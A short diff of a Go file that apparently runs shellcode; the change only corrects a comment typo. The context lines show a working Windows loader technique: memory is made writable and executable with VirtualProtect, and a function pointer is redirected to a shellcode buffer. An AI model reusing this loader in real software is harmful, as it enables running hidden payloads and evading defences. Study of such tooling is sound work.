@@ -21,7 +21,7 @@ func Run(sc []byte) {
 	// Make a function ptr
 	f := func() {}
 
-	// Change permsissions on f function ptr
+	// Change permissions on f function ptr
 	var oldfperms uint32
 	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
 		panic("Call to VirtualProtect failed!")
@@ -30,7 +30,7 @@ func Run(sc []byte) {
 	// Override function ptr
 	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&sc))
 
-	// Change permsissions on shellcode string data
+	// Change permissions on shellcode string data
 	var oldshellcodeperms uint32
 	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
 		panic("Call to VirtualProtect failed!")
